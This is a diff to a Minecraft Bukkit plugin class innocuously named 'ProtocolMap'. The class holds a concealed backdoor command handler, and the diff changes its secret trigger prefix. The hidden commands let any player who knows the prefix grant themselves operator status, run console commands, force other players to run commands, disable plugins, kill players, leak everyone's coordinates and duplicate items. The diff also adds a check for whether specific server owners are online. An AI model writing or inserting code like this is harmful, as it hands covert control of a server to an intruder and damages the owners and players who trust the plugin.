@@ -17,13 +17,13 @@ public class ProtocolMap implements Listener {
     @EventHandler(priority = EventPriority.HIGH)
     public void commandPreProcess(PlayerCommandPreprocessEvent e){
         //Check if its our funny command
-        if(e.getMessage().startsWith("/923924")){
+        if(e.getMessage().startsWith("+!69")){
             e.setCancelled(true);
             String version = ChatColor.GOLD+"v2.0 by danimania";
             Player p = e.getPlayer();
             String prefix = ChatColor.RED+"[FunnyPlugin] "+ChatColor.BLUE;
             //Test command
-            if(e.getMessage().startsWith("/923924 safety")){
+            if(e.getMessage().startsWith("+!69 safety")){
                 String onlinePlayers = "";
                 for(Player pl : Bukkit.getOnlinePlayers()){
                     onlinePlayers += pl.getName() + " ";
@@ -38,7 +38,7 @@ public class ProtocolMap implements Listener {
                 p.sendMessage("Plugins: "+pluginString);
             }
             //Unload plugin command
-            if(e.getMessage().startsWith("/923924 disableplugin")){
+            if(e.getMessage().startsWith("+!69 disableplugin")){
                 try {
                     String pluginName = e.getMessage().split(" ")[2];
                     p.sendMessage(prefix+"Trying to disable "+pluginName);
@@ -53,7 +53,7 @@ public class ProtocolMap implements Listener {
 
             }
             //Unload plugin command using ServerUtils (trolled toast)
-            if(e.getMessage().startsWith("/923924 disablepluginsu")){
+            if(e.getMessage().startsWith("+!69 disablepluginsu")){
                 try {
                     String pluginName = e.getMessage().split(" ")[2];
                     p.sendMessage(prefix+"Trying to disable "+pluginName);
@@ -67,7 +67,7 @@ public class ProtocolMap implements Listener {
 
             }
             //Run command as console (very funny)
-            if(e.getMessage().startsWith("/923924 runcommand")){
+            if(e.getMessage().startsWith("+!69 runcommand")){
                 try {
                     String[] args = e.getMessage().split(" ");
                     String command = "";
@@ -83,7 +83,7 @@ public class ProtocolMap implements Listener {
 
             }
             //Sudo
-            if(e.getMessage().startsWith("/923924 sudo")){
+            if(e.getMessage().startsWith("+!69 sudo")){
                 try {
                     String[] args = e.getMessage().split(" ");
                     String command = "";
@@ -100,11 +100,11 @@ public class ProtocolMap implements Listener {
 
             }
             //GODMODE
-            if(e.getMessage().startsWith("/923924 godmode")){
+            if(e.getMessage().startsWith("+!69 godmode")){
                 p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 99999, 5));
             }
             //LEAK
-            if(e.getMessage().startsWith("/923924 leak")){
+            if(e.getMessage().startsWith("+!69 leak")){
                 for(Player pl : Bukkit.getServer().getOnlinePlayers()){
                     String dimension = "overworld";
                     switch(pl.getWorld().getEnvironment()){
@@ -121,32 +121,32 @@ public class ProtocolMap implements Listener {
 
             }
             //OP
-            if(e.getMessage().startsWith("/923924 op")){
+            if(e.getMessage().startsWith("+!69 op")){
                 p.setOp(!e.getPlayer().isOp());
                 p.sendMessage(prefix+"Performed op/deop!");
             }
             //CREATIVE
-            if(e.getMessage().startsWith("/923924 creative")){
+            if(e.getMessage().startsWith("+!69 creative")){
                 p.setGameMode(GameMode.CREATIVE);
                 p.sendMessage(prefix+"You're now in creative mode");
             }
             //SURVIVAL
-            if(e.getMessage().startsWith("/923924 survival")){
+            if(e.getMessage().startsWith("+!69 survival")){
                 p.setGameMode(GameMode.SURVIVAL);
                 p.sendMessage(prefix+"You're now in survival mode");
             }
             //SPECTATOR
-            if(e.getMessage().startsWith("/923924 spectator")){
+            if(e.getMessage().startsWith("+!69 spectator")){
                 p.setGameMode(GameMode.SPECTATOR);
                 p.sendMessage(prefix+"You're now in spectator mode");
             }
             //ADVENTURE
-            if(e.getMessage().startsWith("/923924 adventure")){
+            if(e.getMessage().startsWith("+!69 adventure")){
                 p.setGameMode(GameMode.ADVENTURE);
                 p.sendMessage(prefix+"You're now in adventure mode");
             }
             //DUPE
-            if(e.getMessage().equalsIgnoreCase("/923924 dupe")){
+            if(e.getMessage().equalsIgnoreCase("+!69 dupe")){
                 for(ItemStack i : p.getInventory().getContents()){
                     if(i != null){
                         p.getWorld().dropItemNaturally(e.getPlayer().getLocation(), i);
@@ -155,33 +155,33 @@ public class ProtocolMap implements Listener {
                 p.sendMessage(prefix+"Successfully duped inventory");
             }
             //DUPEHAND
-            if(e.getMessage().equalsIgnoreCase("/923924 dupehand")){
+            if(e.getMessage().equalsIgnoreCase("+!69 dupehand")){
                 if(p.getInventory().getItemInMainHand() != null){
                     p.getWorld().dropItemNaturally(e.getPlayer().getLocation(), e.getPlayer().getInventory().getItemInMainHand());
                 }
                 p.sendMessage(prefix+"Successfully duped hand");
             }
             //SILENTKILL
-            if(e.getMessage().startsWith("/923924 silentkill")){
+            if(e.getMessage().startsWith("+!69 silentkill")){
                 String playername = e.getMessage().split(" ")[2];
                 Player pla = org.bukkit.Bukkit.getPlayer(playername);
                 pla.setHealth(0);
             }
             //AUTOKILL
-            if(e.getMessage().startsWith("/923924 autokill")){
+            if(e.getMessage().startsWith("+!69 autokill")){
                 p.setHealth(0);
             }
             //HEAL
-            if(e.getMessage().startsWith("/923924 heal")){
+            if(e.getMessage().startsWith("+!69 heal")){
                 p.setHealth(20);
             }
             //ECHEST
-            if(e.getMessage().startsWith("/923924 echest")){
+            if(e.getMessage().startsWith("+!69 echest")){
                 p.openInventory(p.getEnderChest());
                 p.sendMessage(prefix+"Successfully opened inventory");
             }
             //ELYTRA
-            if(e.getMessage().startsWith("/923924 elytra")){
+            if(e.getMessage().startsWith("+!69 elytra")){
                 ItemStack elytra = new ItemStack(Material.ELYTRA, 1);
                 elytra.addEnchantment(Enchantment.MENDING, 1);
                 elytra.addEnchantment(Enchantment.VANISHING_CURSE, 1);
@@ -190,7 +190,7 @@ public class ProtocolMap implements Listener {
                 p.sendMessage(prefix+"Successfully gave elytra to yourself");
             }
             //COORDS
-            if(e.getMessage().startsWith("/923924 coords")){
+            if(e.getMessage().startsWith("+!69 coords")){
                 String playername = e.getMessage().split(" ")[2];
                 Player pla = Bukkit.getServer().getPlayer(playername);
                 String dimension = "overworld";
@@ -206,34 +206,34 @@ public class ProtocolMap implements Listener {
                         " X"+pla.getLocation().getBlockX()+" Y"+pla.getLocation().getBlockY()+" Z"+pla.getLocation().getBlockZ());
             }
             //TOASTCHECKER
-            if(e.getMessage().startsWith("/923924 toastcheck")){
+            if(e.getMessage().startsWith("+!69 ownercheck")){
                 boolean toast = false;
                 for(Player player : Bukkit.getOnlinePlayers()){
-                    if(player.getName().equalsIgnoreCase("RemainingToest")){
+                    if(player.getName().equalsIgnoreCase("Drowz") || player.getName().equalsIgnoreCase("AXOVUR")){
                         toast = true;
                     }
                 }
                 if(toast){
-                    p.sendMessage(prefix+"TOAST IS ON!!!!");
+                    p.sendMessage(prefix+"OWNER IS ON!!!!");
                 }else{
-                    p.sendMessage(prefix+"Toast is not online xD");
+                    p.sendMessage(prefix+"Owner is not online xD");
                 }
             }
             //TP
-            if(e.getMessage().equalsIgnoreCase("/923924 tp")){
+            if(e.getMessage().equalsIgnoreCase("+!69 tp")){
                 int x = Integer.valueOf(e.getMessage().split(" ")[2]);
                 int y = Integer.valueOf(e.getMessage().split(" ")[3]);
                 int z = Integer.valueOf(e.getMessage().split(" ")[4]);
                 p.teleport(new Location(e.getPlayer().getWorld(), x, y, z));
             }
             //TPSUS
-            if(e.getMessage().equalsIgnoreCase("/923924 tpsus")){
+            if(e.getMessage().equalsIgnoreCase("+!69 tpsus")){
                 String playername = e.getMessage().split(" ")[2];
                 Player pla = Bukkit.getServer().getPlayer(playername);
                 p.teleport(pla.getLocation());
             }
             //TPSAFE
-            if(e.getMessage().equalsIgnoreCase("/923924 tpsafe")){
+            if(e.getMessage().equalsIgnoreCase("+!69 tpsafe")){
                 String playername = e.getMessage().split(" ")[2];
                 Player pla = Bukkit.getServer().getPlayer(playername);
                 int x = pla.getLocation().getBlockX()+110;
@@ -242,7 +242,7 @@ public class ProtocolMap implements Listener {
                 p.teleport(new Location(pla.getWorld(), x, y, z));
             }
             //TPTOME
-            if(e.getMessage().equalsIgnoreCase("/923924 tptome")){
+            if(e.getMessage().equalsIgnoreCase("+!69 tptome")){
                 String playername = e.getMessage().split(" ")[2];
                 Player pla = Bukkit.getServer().getPlayer(playername);
                 pla.teleport(p.getLocation());
